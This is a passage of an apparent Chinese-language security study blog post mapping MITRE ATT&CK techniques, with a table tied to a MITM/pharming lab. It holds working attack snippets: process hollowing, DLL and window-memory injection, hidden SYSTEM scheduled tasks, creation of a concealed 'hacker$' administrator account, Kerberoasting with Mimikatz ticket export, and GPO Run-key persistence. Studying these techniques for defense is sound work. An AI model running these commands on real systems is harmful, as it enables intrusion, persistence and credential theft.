+<li><strong>反射式 DLL 注入</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HMODULE WINAPI <span class="title">ReflectiveLoader</span><span class="params">(VOID)</span> </span>{</span><br><span class="line">    <span class="comment">// 解析 PE 結構</span></span><br><span class="line">    <span class="comment">// 處理重定位</span></span><br><span class="line">    <span class="comment">// 解析匯入表</span></span><br><span class="line">    <span class="comment">// 呼叫 DLL 主函式</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>進階處理程序挖空</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">CreateProcessW</span>(<span class="literal">NULL</span>, <span class="string">L"svchost.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(pi.hProcess, (LPCVOID)(ctx.Rdx + <span class="number">0x10</span>), &amp;pImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ZwUnmapViewOfSection</span>(pi.hProcess, pImageBase);</span><br><span class="line"><span class="built_in">VirtualAllocEx</span>(pi.hProcess, pImageBase, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, pImageBase, pMaliciousPE, dwImageSize, <span class="literal">NULL</span>);</span><br><span class="line">ctx.Rcx = (DWORD_PTR)pImageBase + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint;</span><br><span class="line"><span class="built_in">SetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread);</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>Atom Bombing</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ATOM atom = <span class="built_in">GlobalAddAtom</span>(<span class="string">L"MaliciousCode"</span>);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, GWLP_USERDATA, atom);</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_GETTEXT, dwCodeSize, (LPARAM)pCodeBuffer);</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>Extra Window Memory 注入</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HWND hWnd = <span class="built_in">CreateWindow</span>(...);</span><br><span class="line"><span class="built_in">SetWindowLongPtr</span>(hWnd, GWLP_USERDATA, (LONG_PTR)pMaliciousCode);</span><br><span class="line"><span class="built_in">SendMessage</span>(hWnd, WM_USER, <span class="number">0</span>, <span class="number">0</span>);</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="排程工作-任務-Scheduled-Task-Job"><a href="#排程工作-任務-Scheduled-Task-Job" class="headerlink" title="排程工作/任務 (Scheduled Task/Job)"></a>排程工作/任務 (Scheduled Task/Job)</h4><ul>
+<li><strong>COM 介面建立工作</strong>  <figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">CoCreateInstance</span>(CLSID_TaskScheduler, <span class="literal">NULL</span>, CLSCTX_INPROC_SERVER, IID_ITaskService, (<span class="type">void</span>**)&amp;pService);</span><br><span class="line">pService-&gt;<span class="built_in">Connect</span>(<span class="type">_variant_t</span>(), <span class="type">_variant_t</span>(), <span class="type">_variant_t</span>(), <span class="type">_variant_t</span>());</span><br><span class="line">ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">pService-&gt;<span class="built_in">NewTask</span>(<span class="number">0</span>, &amp;pTask);</span><br><span class="line"><span class="comment">// 設定觸發器和動作</span></span><br><span class="line"><span class="comment">// 註冊工作</span></span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>隱藏的排程工作</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /tn "\Microsoft\Windows\MaliciousTask" /tr "C:\malicious.exe" /sc onstart /ru SYSTEM /f</span><br><span class="line">schtasks /create /xml "C:\malicious_task.xml" /tn "HiddenTask"</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>AT 命令（舊版系統）</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> <span class="number">23</span>:<span class="number">59</span> /every:M,T,W,Th,F,S,Su C:\malicious.exe</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="有效帳戶-Valid-Accounts"><a href="#有效帳戶-Valid-Accounts" class="headerlink" title="有效帳戶 (Valid Accounts)"></a>有效帳戶 (Valid Accounts)</h4><ul>
+<li><strong>本機帳戶操作：建立隱藏管理員帳戶</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user hacker$ password123 /add</span><br><span class="line"><span class="built_in">net</span> localgroup administrators hacker$ /add</span><br><span class="line">reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "hacker$" /t REG_DWORD /d <span class="number">0</span> /f</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>服務帳戶濫用：Kerberoasting 攻擊</strong>  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> {ServicePrincipalName <span class="operator">-ne</span> <span class="string">"<span class="variable">$null</span>"</span>} <span class="literal">-Properties</span> ServicePrincipalName</span><br><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">"SPN/server.domain.com"</span></span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span> <span class="literal">-Command</span> <span class="string">'"kerberos::list /export"'</span></span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="網域政策修改-Domain-Policy-Modification"><a href="#網域政策修改-Domain-Policy-Modification" class="headerlink" title="網域政策修改 (Domain Policy Modification)"></a>網域政策修改 (Domain Policy Modification)</h4><ul>
+<li><strong>GPO 修改技術</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gpmc.msc</span><br><span class="line">Import-Module GroupPolicy</span><br><span class="line"><span class="built_in">Set</span>-GPRegistryValue -Name "Default Domain Policy" -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -ValueName "Malicious" -<span class="built_in">Type</span> String -Value "C:\malicious.exe"</span><br></pre></td></tr></tbody></table></figure></li>
+<li><strong>SYSVOL 檔案修改</strong>  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 路徑: \\domain.com\SYSVOL\domain.com\Policies\{GPO-GUID}\Machine\Registry.pol</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<hr>
+<h4 id="實用工具與命令參考"><a href="#實用工具與命令參考" class="headerlink" title="實用工具與命令參考"></a>實用工具與命令參考</h4><ul>
+<li>權限列舉命令  <figure class="highlight cmd"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line">whoami /groups</span><br><span class="line">accesschk.exe -uwcqv "Authenticated Users" *</span><br><span class="line">accesschk.exe -uwcqv "Users" *</span><br><span class="line">accesschk.exe -kqsv HKLM\SYSTEM\CurrentControlSet\Services</span><br><span class="line">wmic service get name,displayname,pathname,startmode | <span class="built_in">findstr</span> /i "auto" | <span class="built_in">findstr</span> /i /v "c:\windows\\" | <span class="built_in">findstr</span> /i /v """"</span><br></pre></td></tr></tbody></table></figure></li>
+<li>PowerShell 權限提升腳本  <figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System</span><br><span class="line"><span class="built_in">Get-CimInstance</span> Win32_StartupCommand | <span class="built_in">Select-Object</span> Name, command, Location, User</span><br><span class="line"><span class="built_in">Get-ScheduledTask</span> | <span class="built_in">Where-Object</span> {<span class="variable">$_</span>.Principal.UserId <span class="operator">-eq</span> <span class="string">"SYSTEM"</span>}</span><br><span class="line"><span class="variable">$env:PATH</span> <span class="operator">-split</span> <span class="string">';'</span> | <span class="built_in">ForEach-Object</span> { <span class="keyword">if</span> (<span class="built_in">Test-Path</span> <span class="variable">$_</span>) { <span class="built_in">Get-ChildItem</span> <span class="variable">$_</span> <span class="operator">-File</span> <span class="literal">-Filter</span> <span class="string">"*.dll"</span> } }</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+
+
+<ul>
+<li>A MITM and Pharming Attacks break down to the framework of ATT&amp;CK<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique</th>
+<th>Project Corr</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Reconnaissance</td>
+<td>Active Scanning</td>
+<td><strong>Task I: Device Address Information Collection.</strong><br> The initial phase involves actively scanning the local network to identify potential targets by collecting IP and MAC addresses.</td>
+</tr>
+<tr>
+<td>Initial Access</td>
+<td>Exploit Public-Facing Application</td>
+<td>While not a traditional public-facing application, the Wi-Fi network serves as the entry point.<br> The attack exploits weak configurations that allow for ARP and ICMP manipulation.</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>Inter-Process Communication</td>
+<td><strong>Task II &amp; III.</strong> The attacker’s code will interact with the operating system’s networking stack at a low level using raw sockets and Netfilter queues to inject and manipulate traffic.</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Input Capture</td>
+<td><strong>Task III: DNS Spoofing.</strong> <br> The ultimate goal of the pharming attack is to present a phishing page to the victim to capture credentials or other sensitive information.</td>
+</tr>
+<tr>
+<td>Lateral Movement / Defense Evasion</td>
+<td>Man-in-the-Middle</td>
+<td><strong>Task II: ICMP Redirect Attack.</strong> <br> The core of the attack is to position the attacker’s machine between the victim and the gateway by manipulating the victim’s routing table with forged ICMP redirect messages. <br> This intercepts traffic for further exploitation.</td>
+</tr>
+<tr>
+<td>Impact</td>
+<td>Defacement</td>
+<td><strong>Task III: DNS Spoofing</strong>. By redirecting the user to a phishing page, the attacker is effectively defacing the intended website from the victim’s perspective.</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://withoutdirection.github.io">烏鴉先生</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/">http://withoutdirection.github.io/Mitre-ATT-CK-Techniues-note/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/crow.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/sinica-cs-summer-internship/" title="中研院資訊所暑期實習"><div class="cover" style="background: 縮略圖"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">中研院資訊所暑期實習</div></div><div class="info-2"><div class="info-item-1">中研院資訊所暑期實習前言 申請 實習札記Day 1 不想早起   因為是第一天怕遲到，早上六點半就起床去搭高鐵，結果早了快一個小時到，通勤時間約為一個半小時上午都在On board，行政效率非常之好mentor簡單介紹了前兩週的準備工作      Note of today About Mittre ATT&amp;CK framework ATT&amp;CK The MITRE ATT&amp;CK framework is a globally accessible knowledge base of adversary tactics$\text{攻擊目的}$ and techniques$\text{使用的手法}$ based on real-world observations.     Today’s achievements:  完成On board  Caldera server establishment  Windows VM (act as a victim) setup    Day...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/crow.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">烏鴉先生</div><div class="author-info-description">隨手寫東西</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/WithoutDirection"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BF%AB%E7%94%A8%E6%AC%8A%E9%99%90%E6%8F%90%E5%8D%87%E6%8E%A7%E5%88%B6%E6%A9%9F%E5%88%B6-Abuse-Elevation-Control-Mechanism"><span class="toc-number">1.</span> <span class="toc-text">濫用權限提升控制機制 (Abuse Elevation Control Mechanism)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%8F%96%E6%AC%8A%E6%9D%96%E6%93%8D%E6%8E%A7-Access-Token-Manipulation"><span class="toc-number">2.</span> <span class="toc-text">存取權杖操控 (Access Token Manipulation)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%96%8B%E6%A9%9F%E6%88%96%E7%99%BB%E5%85%A5%E6%99%82%E8%87%AA%E5%8B%95%E5%95%9F%E5%8B%95%E5%9F%B7%E8%A1%8C-Boot-or-Logon-Autostart-Execution"><span class="toc-number">3.</span> <span class="toc-text">開機或登入時自動啟動執行 (Boot or Logon Autostart Execution)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E6%88%96%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%B5%B1%E8%99%95%E7%90%86%E7%A8%8B%E5%BA%8F-Create-or-Modify-System-Process"><span class="toc-number">4.</span> <span class="toc-text">建立或修改系統處理程序 (Create or Modify System Process)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%A7%B8%E7%99%BC%E5%9F%B7%E8%A1%8C-Event-Triggered-Execution"><span class="toc-number">5.</span> <span class="toc-text">事件觸發執行 (Event Triggered Execution)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81%E5%9F%B7%E8%A1%8C%E6%B5%81%E7%A8%8B-Hijack-Execution-Flow"><span class="toc-number">6.</span> <span class="toc-text">劫持執行流程 (Hijack Execution Flow)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%99%95%E7%90%86%E7%A8%8B%E5%BA%8F%E6%B3%A8%E5%85%A5-Process-Injection"><span class="toc-number">7.</span> <span class="toc-text">處理程序注入 (Process Injection)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%92%E7%A8%8B%E5%B7%A5%E4%BD%9C-%E4%BB%BB%E5%8B%99-Scheduled-Task-Job"><span class="toc-number">8.</span> <span class="toc-text">排程工作/任務 (Scheduled Task/Job)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E6%95%88%E5%B8%B3%E6%88%B6-Valid-Accounts"><span class="toc-number">9.</span> <span class="toc-text">有效帳戶 (Valid Accounts)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B6%B2%E5%9F%9F%E6%94%BF%E7%AD%96%E4%BF%AE%E6%94%B9-Domain-Policy-Modification"><span class="toc-number">10.</span> <span class="toc-text">網域政策修改 (Domain Policy Modification)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%A6%E7%94%A8%E5%B7%A5%E5%85%B7%E8%88%87%E5%91%BD%E4%BB%A4%E5%8F%83%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">實用工具與命令參考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Mitre-ATT-CK-Techniues-note/" title="Untitled">Untitled</a><time datetime="2025-07-28T02:21:36.368Z" title="Created 2025-07-28 10:21:36">2025-07-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/sinica-cs-summer-internship/" title="中研院資訊所暑期實習">中研院資訊所暑期實習</a><time datetime="2025-06-30T16:00:00.000Z" title="Created 2025-07-01 00:00:00">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/Computer-security-self-study/" title="自學電安的52周">自學電安的52周</a><time datetime="2025-06-05T11:01:23.631Z" title="Created 2025-06-05 19:01:23">2025-06-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/CSC-final/" title="電腦安全總整與實作期末筆記">電腦安全總整與實作期末筆記</a><time datetime="2025-05-29T16:00:00.000Z" title="Created 2025-05-30 00:00:00">2025-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/NA-midterm/" title="NA 期中大抄">NA 期中大抄</a><time datetime="2025-04-18T16:00:00.000Z" title="Created 2025-04-19 00:00:00">2025-04-19</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2019 - 2025 By 烏鴉先生</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
